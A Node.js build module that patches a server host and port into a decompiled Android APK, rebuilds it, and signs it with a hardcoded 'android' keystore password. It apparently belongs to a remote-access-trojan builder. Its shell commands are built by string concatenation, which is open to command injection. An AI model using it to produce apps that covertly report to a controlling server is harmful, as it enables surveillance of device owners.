const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let versionStr = "";
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        if (javaIndex !== -1) versionStr = output.substring(javaIndex, (javaIndex + 27));
        else if (openJDKIndex !== -1) versionStr = output.substring(openJDKIndex, (openJDKIndex + 27));
        if (versionStr === "") return callback("Java Not Installed", undefined);
        let match = versionStr.match(/(\d+)\.(\d+)/);
        if (match) {
            let major = parseInt(match[1]);
            let minor = parseInt(match[2]);
            let isJava8 = (major === 1 && minor === 8);
            let isJava9OrLater = (major >= 9);
            if (isJava8 || isJava9OrLater) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, versionStr + ' (full: ' + output.trim() + ')');
            }
        }
        return callback("Wrong Java Version Installed. Detected " + versionStr + ". Please use Java 8 or later", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function log(msg) {
    try { logManager.log(CONST.logTypes.info, '[BUILD] ' + msg); } catch(e) {}
}

function verifyAPK(path, cb) {
    log('Verifying APK: ' + path);
    let stats = fs.statSync(path);
    log('APK size: ' + stats.size + ' bytes');
    if (stats.size < 50000) return cb('APK too small (' + stats.size + ' bytes)');

    // Check it's a valid ZIP by reading magic bytes
    let fd = fs.openSync(path, 'r');
    let buf = Buffer.alloc(4);
    fs.readSync(fd, buf, 0, 4, 0);
    fs.closeSync(fd);
    if (buf[0] !== 0x50 || buf[1] !== 0x4B || buf[2] !== 0x03 || buf[3] !== 0x04) {
        return cb('APK is not a valid ZIP file (magic: ' + buf.toString('hex') + ')');
    }

    // Try apksigner verify if available
    cp.exec('which apksigner', (whichErr) => {
        if (!whichErr) {
            cp.exec('apksigner verify --verbose "' + path + '"', (verifyErr, verifyOut, verifyErrOut) => {
                if (verifyErr) {
                    log('apksigner verify failed: ' + verifyErrOut);
                    return cb('APK signature verification failed');
                }
                log('apksigner verify OK');
                cb(false);
            });
        } else {
            cb(false);
        }
    });
}

function signAPK(cb) {
    cp.exec('which apksigner', (err) => {
        if (!err) {
            log('Using apksigner for signing');
            let cmd = 'apksigner sign --ks "' + CONST.apkKeystore + '" --ks-pass pass:android --key-pass pass:android --out "' + CONST.apkSignedBuildPath + '" "' + CONST.apkBuildPath + '"';
            cp.exec(cmd, (error, stdout, stderr) => {
                if (error) {
                    log('apksigner stderr: ' + stderr);
                    return cb('Apksigner Failed - ' + error.message);
                }
                if (!fs.existsSync(CONST.apkSignedBuildPath)) return cb('Signing produced no output file');
                verifyAPK(CONST.apkSignedBuildPath, cb);
            });
        } else {
            log('apksigner not found, using jarsigner');
            cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (error) {
                    log('jarsigner stderr: ' + stderr);
                    return cb('Sign Command Failed - ' + error.message);
                }
                if (!fs.existsSync(CONST.apkSignedBuildPath)) return cb('Signing produced no output file');
                verifyAPK(CONST.apkSignedBuildPath, cb);
            });
        }
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (err) return cb(err);
        log('Java version: ' + version);

        try { fs.unlinkSync(CONST.apkBuildPath); } catch(e) {}
        try { fs.unlinkSync(CONST.apkSignedBuildPath); } catch(e) {}

        log('Building APK...');
        log('Command: ' + CONST.buildCommand);
        cp.exec(CONST.buildCommand, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
            if (stdout) log('apktool stdout: ' + stdout.substring(0, 500));
            if (stderr) log('apktool stderr: ' + stderr.substring(0, 500));

            if (error) {
                log('apktool error: ' + error.message);
                return cb('Build Command Failed - ' + error.message);
            }
            if (!fs.existsSync(CONST.apkBuildPath)) return cb('Build failed - no output file');
            verifyAPK(CONST.apkBuildPath, (verifyErr) => {
                if (verifyErr) return cb('Unsigned APK invalid: ' + verifyErr);
                signAPK(cb);
            });
        });
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
